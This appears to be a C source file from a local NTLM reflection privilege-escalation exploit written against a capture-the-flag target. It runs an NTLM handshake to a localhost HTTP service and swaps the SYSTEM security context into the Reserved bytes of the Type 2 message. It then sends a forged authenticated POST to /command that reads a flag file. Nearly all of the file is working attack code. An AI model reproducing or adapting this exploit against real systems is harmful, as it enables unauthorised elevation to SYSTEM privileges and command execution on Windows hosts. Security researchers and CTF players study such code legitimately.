#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "windows.h"
#include "stdio.h"
#include "winsock.h"
#include "sspi.h"
#include "Security.h"
#include "HTTPClient.h"


// global vars
extern HANDLE event1;
extern HANDLE event2;
extern HANDLE event3;
extern char SystemContext[];
extern char UserContext[];

SOCKET ConnectSocket2(const wchar_t* ipAddress, int port);
BOOL DoAuthenticatedGETHTTP(SOCKET s);
BOOL GenClientContext2(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText);
char* base64Encode(char* text, int textLen, int* b64Len);
char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen);
int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len);
char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len);
void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len);
char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len);


void HTTPAuthenticatedGET() {
    SOCKET httpSocket = ConnectSocket2(L"127.0.0.1", 80);
    DoAuthenticatedGETHTTP(httpSocket);
    closesocket(httpSocket);
}

BOOL DoAuthenticatedGETHTTP(SOCKET s) {
    BOOL fDone = FALSE;
    DWORD cbOut = 0;
    DWORD cbIn = 0;
    PBYTE pInBuf;
    PBYTE pOutBuf;
    char* sendbuffer = NULL;
    char ntlmType2[DEFAULT_BUFLEN];
    char recBuffer[DEFAULT_BUFLEN];
    int len = 0;
    int reclen = 0;
    CredHandle hCred;
    struct _SecHandle  hcText;

    pInBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
    pOutBuf = (PBYTE)malloc(DEFAULT_BUFLEN);
    cbOut = DEFAULT_BUFLEN;
    
    //ntlm type 1 http auth
    if (!GenClientContext2(NULL, 0, pOutBuf, &cbOut, &fDone, (wchar_t*)L"", &hCred, &hcText))
    {
        printf("[!] GenClientContext2 failed with error code %d\n", GetLastError());
        exit(-1);
    }
    
    sendbuffer = ForgeHTTPRequestType1((char*)pOutBuf, cbOut, &len);
    printf("[*] Sending: %s\n", sendbuffer);
    send(s, sendbuffer, len, 0);

    // handling ntlm type2 part with context swapping
    reclen = recv(s, recBuffer, DEFAULT_BUFLEN - 1, 0);
    recBuffer[reclen] = 0;
    printf("[*] Received: %s\n", recBuffer);
    ExtractType2FromHttp(recBuffer, reclen, ntlmType2, &len);

    if (ntlmType2[8] == 2)
    {
        memcpy(UserContext, &ntlmType2[32], 8);
        WaitForSingleObject(event1, INFINITE);
        // for local auth reflection we don't really need to relay the entire packet 
        // swapping the context in the Reserved bytes with the SYSTEM context is enough
        memcpy(&ntlmType2[32], SystemContext, 8);
    }
    else {
        printf("[!] Authentication over HTTP is not using NTLM. Exiting...\n");
        exit(-1);
    }
    cbOut = DEFAULT_BUFLEN;
    if (!GenClientContext2((BYTE*)ntlmType2, len, pOutBuf, &cbOut, &fDone, (SEC_WCHAR*)L"", &hCred, &hcText)) {
        printf("[!] GenClientContext2 failed with error code %d\n", GetLastError());
        exit(-1);
    }
    SetEvent(event2);
    WaitForSingleObject(event3, INFINITE);

    // handling ntlm type3
    sendbuffer = ForgeHTTPRequestType3((char*)pOutBuf, cbOut, &len);
    printf("[*] Sending: %s\n", sendbuffer);
    send(s, sendbuffer, len, 0);

    // getting response from server
    reclen = recv(s, recBuffer, DEFAULT_BUFLEN - 1, 0);
    recBuffer[reclen] = 0;
    printf("[*] Received: %s\n", recBuffer);

    exit(0);
}

SOCKET ConnectSocket2(const wchar_t* ipAddress, int port) {
    char ipAddress_a[20];
    char remotePort_a[12];
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    memset(remotePort_a, 0, 12);
    memset(ipAddress_a, 0, 20);
    wcstombs(ipAddress_a, ipAddress, 20);
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(ipAddress_a);
    clientService.sin_port = htons(port);
    iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"[!] ConnectSocket: connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    Sleep(1000);
    return ConnectSocket;
}

BOOL GenClientContext2(BYTE* pIn, DWORD cbIn, BYTE* pOut, DWORD* pcbOut, BOOL* pfDone, WCHAR* pszTarget, CredHandle* hCred, struct _SecHandle* hcText)
{
    SECURITY_STATUS ss;
    TimeStamp  Lifetime;
    SecBufferDesc OutBuffDesc;
    SecBuffer OutSecBuff;
    SecBufferDesc InBuffDesc;
    SecBuffer InSecBuff;
    ULONG ContextAttributes;
    PTCHAR lpPackageName = (PTCHAR)NTLMSP_NAME;

    if (NULL == pIn)
    {
        ss = AcquireCredentialsHandle(NULL, lpPackageName, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, hCred, &Lifetime);
        if (!(SEC_SUCCESS(ss)))
        {
            printf("[!] AcquireCredentialsHandleW failed with error code 0x%x\n", ss);
            return FALSE;
        }
    }
    OutBuffDesc.ulVersion = 0;
    OutBuffDesc.cBuffers = 1;
    OutBuffDesc.pBuffers = &OutSecBuff;
    OutSecBuff.cbBuffer = *pcbOut;
    OutSecBuff.BufferType = SECBUFFER_TOKEN;
    OutSecBuff.pvBuffer = pOut;
    if (pIn)
    {
        InBuffDesc.ulVersion = 0;
        InBuffDesc.cBuffers = 1;
        InBuffDesc.pBuffers = &InSecBuff;
        InSecBuff.cbBuffer = cbIn;
        InSecBuff.BufferType = SECBUFFER_TOKEN;
        InSecBuff.pvBuffer = pIn;
        ss = InitializeSecurityContext(hCred, hcText, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, &InBuffDesc, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);

    }
    else
        ss = InitializeSecurityContext(hCred, NULL, (SEC_WCHAR*)pszTarget, MessageAttribute, 0, SECURITY_NATIVE_DREP, NULL, 0, hcText, &OutBuffDesc, &ContextAttributes, &Lifetime);
    if (!SEC_SUCCESS(ss))
    {
        printf("[!] InitializeSecurityContext failed with error code 0x%x\n", ss);
        return FALSE;
    }
    if ((SEC_I_COMPLETE_NEEDED == ss)
        || (SEC_I_COMPLETE_AND_CONTINUE == ss))
    {
        ss = CompleteAuthToken(hcText, &OutBuffDesc);
        if (!SEC_SUCCESS(ss))
        {
            fprintf(stderr, "complete failed: 0x%08x\n", ss);
            return FALSE;
        }
    }
    *pcbOut = OutSecBuff.cbBuffer;
    *pfDone = !((SEC_I_CONTINUE_NEEDED == ss) || (SEC_I_COMPLETE_AND_CONTINUE == ss));
    return TRUE;
}

char* base64Encode(char* text, int textLen, int* b64Len) {
    *b64Len = DEFAULT_BUFLEN;
    char* b64Text = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *b64Len);
    if (!CryptBinaryToStringA((const BYTE*)text, textLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Text, (DWORD*)b64Len)) {
        printf("CryptBinaryToStringA failed with error code %d", GetLastError());
        HeapFree(GetProcessHeap(), 0, b64Text);
        b64Text = NULL;
        exit(-1);
    }
    return b64Text;
}

char* base64Decode(char* b64Text, int b64TextLen, int* bufferLen) {
    *bufferLen = DEFAULT_BUFLEN;
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *bufferLen);
    if (!CryptStringToBinaryA((LPCSTR)b64Text, b64TextLen, CRYPT_STRING_BASE64, (BYTE*)buffer, (DWORD*)bufferLen, NULL, NULL)) {
        printf("CryptStringToBinaryA failed with error code %d", GetLastError());
        HeapFree(GetProcessHeap(), 0, buffer);
        buffer = NULL;
        exit(-1);
    }
    return buffer;
}

int findBase64NTLM(char* buffer, int buffer_len, char* outbuffer, int* outbuffer_len) {
    char pattern_head[] = { 'N', 'T', 'L', 'M', ' ' };
    char pattern_tail[2] = { 0x0D, 0x0A }; // \r\n
    int index_start = 0;
    for (int i = 0; i < buffer_len; i++) {
    }
    for (int i = 0; i < buffer_len; i++) {
        if (buffer[i] == pattern_head[index_start]) {
            index_start = index_start + 1;
            if (index_start == sizeof(pattern_head)) {
                index_start = i + 1;
                break;
            }
        }
    }
    *outbuffer_len = 0;
    for (int i = index_start; i < buffer_len; i++) {
        if (buffer[i] == pattern_tail[0] && buffer[i + 1] == pattern_tail[1]) {
            break;
        }
        outbuffer[(*outbuffer_len)] = buffer[i];
        *outbuffer_len = (*outbuffer_len) + 1;
    }
    return 0;
}

char* ForgeHTTPRequestType1(char* ntlmsspType1, int ntlmsspType1Len, int* httpPacketType1Len) {
    char httpPacketTemplate[] = "GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: NTLM %s\r\n\r\n";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char* b64ntlmTmp = base64Encode(ntlmsspType1, ntlmsspType1Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType1Len = sprintf(httpPacket, httpPacketTemplate, b64ntlm);
    return httpPacket;
}

void ExtractType2FromHttp(char* httpPacket, int httpPacketLen, char* ntlmType2, int* ntlmType2Len) {
    char b64Type2[DEFAULT_BUFLEN];
    int b64Type2Len = 0;
    findBase64NTLM(httpPacket, httpPacketLen, b64Type2, &b64Type2Len);
    char* decodedType2Tmp = base64Decode(b64Type2, b64Type2Len, ntlmType2Len);
    memset(ntlmType2, 0, DEFAULT_BUFLEN);
    memcpy(ntlmType2, decodedType2Tmp, *ntlmType2Len);
}

char* ForgeHTTPRequestType3(char* ntlmsspType3, int ntlmsspType3Len, int* httpPacketType3Len) {
    char httpPacketTemplate[] = "POST /command HTTP/1.1\r\nHost: localhost\r\nAuthorization: NTLM %s\r\nContent-Type: application/json\r\nContent-Length: 36\r\nConnection: Keep-Alive\r\n\r\n{\"command\":\"cat C:\\\\flag\\\\flag.txt\"}";
    char* httpPacket = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, DEFAULT_BUFLEN);
    int b64ntlmLen;
    char* b64ntlmTmp = base64Encode(ntlmsspType3, ntlmsspType3Len, &b64ntlmLen);
    char b64ntlm[DEFAULT_BUFLEN];
    memset(b64ntlm, 0, DEFAULT_BUFLEN);
    memcpy(b64ntlm, b64ntlmTmp, b64ntlmLen);
    *httpPacketType3Len = sprintf(httpPacket, httpPacketTemplate, b64ntlm);
    return httpPacket;
}
